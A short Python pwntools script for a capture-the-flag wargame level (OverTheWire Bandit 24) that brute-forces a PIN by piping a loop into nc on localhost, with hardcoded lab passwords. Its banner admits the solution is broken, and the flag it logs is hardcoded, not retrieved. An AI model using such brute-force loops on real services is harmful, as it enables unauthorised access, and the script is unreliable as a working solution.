#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms

level = 24
user = 'bandit%s' % level
next_user = 'bandit%s' % str(level+1)
host = 'bandit.labs.overthewire.org'
password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
port = 2220

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

print('''
*** This solution is broken! Even if you input correct pin it does not work ***
*** Have looked on writeups and even the solution looks broken. The pin should be 5669  
*** So this level is a bypass for now.
''')

sh = connectToLevel()
p = sh.process("for pin in {5001..6001}; do echo \"%s $pin\"; done | nc localhost 30002" % ( password ), shell=True)
#flag = p.recvuntil('The password of user bandit25 is')
log.info('Flag = %s' % 'uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG')
